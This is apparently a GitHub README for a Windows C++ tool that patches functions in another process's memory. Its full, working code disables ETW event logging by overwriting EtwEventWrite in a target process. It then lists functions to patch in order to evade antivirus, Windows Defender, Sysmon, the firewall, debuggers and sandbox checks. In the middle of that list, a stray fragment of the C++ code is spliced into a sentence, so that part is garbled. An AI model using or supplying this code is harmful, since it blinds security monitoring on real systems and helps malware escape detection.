# RemoteFunctionPatcher
Patch (block) whatever function you want in a remote process.

Add the following assembler instructions in the first memory address of the victim function:
```cpp
0x48, 0x31, 0xC0,       // xor rax, rax
0xC3                    // ret
```

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>

// Function to find the base address of a module in the target process
LPVOID GetRemoteModuleHandle(DWORD dwPID, const wchar_t* moduleName) {
    MODULEENTRY32W moduleEntry;
    moduleEntry.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, dwPID);
    if (hModuleSnap == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    if (Module32FirstW(hModuleSnap, &moduleEntry)) {
        do {
            if (_wcsicmp(moduleEntry.szModule, moduleName) == 0) {
                CloseHandle(hModuleSnap);
                return moduleEntry.modBaseAddr;
            }
        } while (Module32NextW(hModuleSnap, &moduleEntry));
    }

    CloseHandle(hModuleSnap);
    return NULL;
}

int getPIDbyProcName(const std::string& procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32NextW(hSnap, &pe32) != FALSE) {
            std::wstring wideProcName(procName.begin(), procName.end());
            if (wcscmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
                pid = pe32.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return pid;
}

BOOL PatchRemoteFunction(DWORD dwPID, LPVOID remoteFunctionAddress) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL) {
        return FALSE;
    }

    // Shellcode for 64-bit (you can add the 32-bit version similarly)
#ifdef _WIN64
    unsigned char patch[] = {
        0x48, 0x31, 0xC0,       // xor rax, rax
        0xC3                    // ret
    };
#else
    unsigned char patch[] = {
        0x33, 0xC0,             // xor eax, eax
        0xC2, 0x14, 0x00        // ret 14
    };
#endif

    SIZE_T patchSize = sizeof(patch);
    DWORD oldProtect;

    // Change memory protection to PAGE_EXECUTE_READWRITE
    if (!VirtualProtectEx(hProcess, remoteFunctionAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the patch to the remote process memory
    if (!WriteProcessMemory(hProcess, remoteFunctionAddress, patch, patchSize, NULL)) {
        VirtualProtectEx(hProcess, remoteFunctionAddress, patchSize, oldProtect, &oldProtect);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Restore the original memory protection
    VirtualProtectEx(hProcess, remoteFunctionAddress, patchSize, oldProtect, &oldProtect);

    // Flush the instruction cache to ensure the new instructions are executed
    FlushInstructionCache(hProcess, remoteFunctionAddress, patchSize);

    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    DWORD pid = getPIDbyProcName("notepad.exe");
    const wchar_t* dllName = L"ntdll.dll"; 
    const char* functionName = "EtwEventWrite";

    // Get handle to the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open target process.\n");
        return 1;
    }

    // Get the base address of ntdll.dll in the target process
    LPVOID moduleBase = GetRemoteModuleHandle(pid, dllName);
    if (moduleBase == NULL) {
        printf("Failed to find module base address.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Get the address of EtwEventWrite function in the local process
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    LPVOID localFunctionAddress = GetProcAddress(hNtdll, functionName);
    if (localFunctionAddress == NULL) {
        printf("Failed to find function address.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Calculate the remote function address
    LPVOID remoteFunctionAddress = (LPVOID)((uintptr_t)moduleBase + ((uintptr_t)localFunctionAddress - (uintptr_t)hNtdll));

    // Patch the remote function to disable EtwEventWrite
    if (PatchRemoteFunction(pid, remoteFunctionAddress)) {
        printf("ETW disabled in remote process %d\n", pid);
    }
    else {
        printf("Failed to disable ETW in remote process %d\n", pid);
    }

    CloseHandle(hProcess);
    return 0;
}
```

Result:

![image](https://github.com/S12cybersecurity/RemoteFunctionPatcher/assets/79543461/6f537f0f-545c-4bcd-9537-439c5dbfcdad)

**Interesting victim functions to patch:**
### Logging and Monitoring Functions

1. **Event Tracing for Windows (ETW)**:
    
    - `EtwEventWrite`: To prevent event logging.
2. **Windows Management Instrumentation (WMI)**:
    
    - `IWbemServices::ExecQuery`: To avoid detection via WMI queries.
3. **Sysmon (System Monitor)**:
    
    - `SysmonService`: To disable or alter the Sysmon service that monitors and logs system events.

### Security and Protection Functions

1. **Antivirus and Security Software**:
    
    - `AVASTEngineScan`: Specific antivirus engine functions.
    - `KasperskyProtect`: Functions related to specific antivirus protections.
2. **Windows Defender**:
    
    - `MpScanStart`: Windows Defender scan initiation functions.
    - `WdFilter.sys`: The Windows Defender filter driver.
3. **Firewall and Network Policies**:
    
    - `FWPolicy2::EnableRuleGroup`: To disable firewall rules.
    - `Netsh`: Command to configure and display the status of network components.

### Integrity and Authenticity Functions

1. **System File Checker (SFC)**:
    
    - `SfcScan`: To prevent the detec
    const wchar_t* dllName = L"ntdll.dll"; 
    const char* functionName = "EtwEventWrite";

    // Get handle to the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {tion of altered system files.
2. **Driver Signature Enforcement**:
    
    - `DrvLoad`: Function to load signed drivers.

### Process and Service Management Functions

1. **Process Management**:
    
    - `OpenProcess`: To prevent obtaining process handles.
    - `TerminateProcess`: To prevent processes from being terminated.
2. **Service Management**:
    
    - `OpenService`: To prevent service manipulation.
    - `ControlService`: To prevent controlling services (start, stop, pause).

### Debugging and Analysis Functions

1. **Debugging**:
    
    - `IsDebuggerPresent`: To evade debugger detection.
    - `CheckRemoteDebuggerPresent`: To evade attached debuggers.
2. **Memory Analysis**:
    
    - `MiniDumpWriteDump`: To avoid generating memory dumps.

### Network and Communication Functions

1. **Sockets and Network Connections**:
    - `send`, `recv`: To manipulate network traffic.
    - `connect`: To prevent connections to command and control (C2) servers.

### Specific Examples:

1. **Blocking Antivirus Scans**:
    
    - Modifying functions that initiate antivirus scans to avoid detection of malicious files.
2. **Preventing Access to Analysis Tools**:
    
    - Blocking functions used by tools like Process Explorer, Process Hacker, and other process and memory analysis tools.
3. **Evading Sandboxing**:
    
    - Altering functions that can detect sandbox environments, such as `GetSystemMetrics` to check if the system is running in a virtual machine.
